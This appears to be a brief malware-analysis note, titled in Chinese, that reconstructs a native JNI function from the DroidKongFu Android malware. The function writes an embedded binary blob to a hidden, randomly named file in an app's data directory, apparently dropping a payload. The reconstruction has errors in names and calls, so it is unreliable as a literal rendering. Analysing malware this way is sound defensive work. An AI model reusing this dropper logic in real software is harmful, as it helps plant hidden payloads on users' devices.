# DroidKongFu的so代码还原

```C++

    int __fastcall Java_com_airpuh_ad_UpdateCheck_DataInit(JNIEnv *env, jobject obj, int mId, int mCh, int mPkg)
    {
        time_t timer;
        int random;
        int jni_id=(*env)->GetStringUTFChars(mId,0);
        char* jni_mCh=(*env)->GetStringUTFChars(mCH,0);
        char* jni_mPkg=(*env)->getStringUTFChars(mPkg,0);//NCuttherope
        if(jni_id){
            if(jni_mCh==null)
            {
                jni_mCh="self";
                memset(s,0,0x100);
                timer=time(&timer);
                //每次运行的timer都是不一样的种子
                //lrand48(产生一个正的长整型随机数)
                //srand(设置随机数种子)
                //srand48(设置48位运算的随机数种子)
                srand48(timer);
                random=lrand48();
                // /data/data/com.tebs3.cuttherope/.e随机数
                sprintf(s, "%s/%s/.e%dd", "/data/data", jni_mPkg, random);
                File file=open(s,578,0x180);
                if(file>0){
                    open(s,&_bindata,0x699C);
                }
                
            }
        }
        return 0;
    }


```





